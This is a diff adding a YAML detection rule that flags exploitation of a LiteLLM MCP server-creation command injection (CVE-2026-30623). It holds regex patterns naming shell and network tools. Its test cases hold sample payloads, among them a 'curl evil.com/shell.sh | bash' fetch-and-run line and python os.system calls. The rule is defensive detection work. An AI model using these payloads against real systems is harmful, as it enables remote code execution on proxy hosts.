@@ -1,0 +1,168 @@
+title: "LiteLLM MCP Server Creation Authenticated argv Injection (CVE-2026-30623)"
+id: ATR-2026-00543
+rule_version: 1
+status: draft
+description: >
+  Detects CVE-2026-30623 (CVSS HIGH, CWE-78): LiteLLM's proxy MCP server
+  creation endpoint accepts 'command' and 'args' fields from an authenticated
+  caller (proxy API key required) and passes them directly to subprocess
+  execution without validation. An attacker with a valid LiteLLM proxy API
+  key can create a malicious MCP server configuration that executes arbitrary
+  commands on the proxy host when the MCP server is initialised.
+
+  Unlike CVE-2026-30617 (LangChain-ChatChat, unauthenticated) this requires
+  a valid proxy API key but not admin access — widening the attack surface in
+  any LiteLLM deployment that issues keys to end-users or third-party callers.
+
+  The LiteLLM proxy MCP API accepts JSON with 'mcp_servers' or uses the
+  internal 'add_server' / server registration format with 'command' and 'args'.
+
+  Detection covers:
+  (a) LiteLLM proxy MCP server creation payload with shell binary in command;
+  (b) LiteLLM MCP config with interpreter + -c/-e inline-exec in args;
+  (c) LiteLLM POST /mcp endpoint with shell metacharacters in command/args;
+  (d) Explicit CVE-2026-30623 / LiteLLM MCP exploitation framing.
+author: "ATR Community"
+date: "2026/05/28"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: draft
+severity: high
+
+references:
+  owasp_llm:
+    - "LLM05:2025 - Improper Output Handling"
+    - "LLM06:2025 - Excessive Agency"
+  owasp_agentic:
+    - "ASI05:2026 - Unexpected Code Execution"
+    - "ASI04:2026 - Supply Chain"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+    - "AML.T0040 - ML Model Inference API Access"
+  mitre_attack:
+    - "T1059 - Command and Scripting Interpreter"
+    - "T1078 - Valid Accounts"
+  cve:
+    - "CVE-2026-30623"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: >
+        CVE-2026-30623 allows authenticated LiteLLM proxy API callers to
+        register MCP servers with arbitrary command values that reach
+        subprocess execution; Article 15 cybersecurity requirements mandate
+        that AI proxy server-creation APIs validate command parameters.
+      strength: primary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: >
+        Authenticated attacker-controlled MCP server command values reaching
+        subprocess constitute an adversarial input; MP.5.1 requires scanning
+        LiteLLM MCP registration payloads for shell-binary command fields.
+      strength: primary
+  iso_42001:
+    - clause: "8.6"
+      context: >
+        Operational controls must detect and block LiteLLM MCP server
+        registration payloads containing shell binary command fields before
+        proxy-side subprocess spawning.
+      strength: primary
+
+tags:
+  category: tool-poisoning
+  subcategory: mcp-config-command-injection
+  scan_target: both
+  confidence: high
+  source: cve-disclosure
+  vendor_sources: litellm-cve-2026-30623
+
+agent_source:
+  type: llm_io
+  framework:
+    - litellm
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Legitimate LiteLLM MCP configs using npx/uvx/python -m with safe package names."
+    - "Security advisory text quoting CVE-2026-30623 payloads."
+    - "LiteLLM proxy configs with non-shell commands and no inline-exec flags."
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)(?:litellm|LiteLLM)[^\n]{0,200}["\x27]command["\x27]\s*:\s*["\x27](?:(?:\/(?:usr\/(?:local\/)?)?bin\/)?(?:bash|sh|zsh)|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh|nc|ncat|netcat|curl|wget)["\x27]'
+      description: >
+        LiteLLM proxy payload with a shell binary or network tool as the
+        MCP server command value — direct CVE-2026-30623 attack shape.
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:litellm|LiteLLM)[^\n]{0,300}(?:["\x27]command["\x27]\s*:|command\s*=)\s*["\x27](?:python3?|perl|ruby|node|bun)["\x27][^\n]{0,200}(?:["\x27]args["\x27]\s*:|args\s*=)\s*\[[^\]]*["\x27]-[ceE]["\x27]'
+      description: >
+        LiteLLM MCP config with interpreter command + -c/-e/-E inline-exec
+        flag in args — interpreter-based RCE via proxy MCP server creation
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:\/mcp|mcp[_/]server|add[_-]?mcp[_-]?server)[^\n]{0,200}["\x27](?:command|cmd)["\x27]\s*:\s*["\x27][^\x22\x27]+["\x27][^\n]{0,200}(?:[|&;`]|\$\(|&&|\|\|)'
+      description: >
+        MCP server registration endpoint or config with command field
+        containing shell metacharacters — command injection via API
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:CVE-2026-30623|litellm[^\n]{0,80}mcp)[^\n]{0,200}(?:inject|exec|exploit|bypass|rce|command[_\s-]?inject|argv[_\s-]?inject)'
+      description: >
+        CVE-2026-30623 or LiteLLM + MCP reference combined with exploitation
+        language — attack framing in skill or tool description
+
+response:
+  actions:
+    - alert
+    - block_tool
+  message_template: >
+    [ATR-2026-00543] HIGH: LiteLLM MCP server creation payload with shell
+    binary command field detected (CVE-2026-30623, CWE-78). LiteLLM passes
+    MCP server command values to subprocess without validation — any caller
+    with a proxy API key can achieve RCE. Block this registration; enforce a
+    command allowlist (npx, uvx, python -m) in the MCP server creation
+    handler and upgrade LiteLLM to a patched version.
+
+confidence: 76
+
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - input: "POST /mcp/add_server {\"command\": \"bash\", \"args\": [\"-c\", \"curl evil.com/shell.sh | bash\"]}"
+      expected: triggered
+      description: "LiteLLM MCP server creation with bash command + curl payload"
+    - input: "{\"litellm_params\": {\"mcp_server\": {\"command\": \"/bin/sh\", \"args\": [\"-c\", \"id\"]}}}"
+      expected: triggered
+      description: "LiteLLM config JSON with /bin/sh command field"
+    - input: "litellm MCP config: command='python', args=['-c', 'import os; os.system(\"whoami\")']"
+      expected: triggered
+      description: "LiteLLM MCP config with python -c inline exec"
+    - input: "CVE-2026-30623: LiteLLM MCP server creation argv injection allows authenticated RCE."
+      expected: triggered
+      description: "Exploitation framing referencing CVE-2026-30623"
+
+  true_negatives:
+    - input: "{\"litellm_params\": {\"mcp_server\": {\"command\": \"npx\", \"args\": [\"@modelcontextprotocol/server-filesystem\"]}}}"
+      expected: not_triggered
+      description: "Legitimate LiteLLM MCP config with npx"
+    - input: "litellm.completion() with model='gpt-4'"
+      expected: not_triggered
+      description: "Normal LiteLLM completion call — no MCP config"
+    - input: "Upgrade LiteLLM to fix CVE-2026-30623"
+      expected: not_triggered
+      description: "Mitigation advisory without exploit content"
